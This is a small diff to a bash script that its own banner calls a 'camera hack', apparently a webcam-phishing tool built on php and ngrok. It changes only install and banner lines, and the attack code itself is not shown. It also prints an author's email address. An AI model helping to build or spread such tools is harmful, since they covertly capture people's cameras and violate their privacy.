@@ -4,12 +4,10 @@
 
 trap 'printf "\n";stop' 2
 sudo apt install php
-Y
-sudo apt install ngrok
 
 banner() {
 clear
-figlet -f banner "captain mimzy" | lolcat
+figlet -f banner "captain mimzy"
 printf " \e[1;93m camera hack \e[0m \n"
 printf " \e[1;77m tiktok: captain mimzy | Email: abdirahmanmustafaabdilahi@gmail.com \e[0m \n"
 
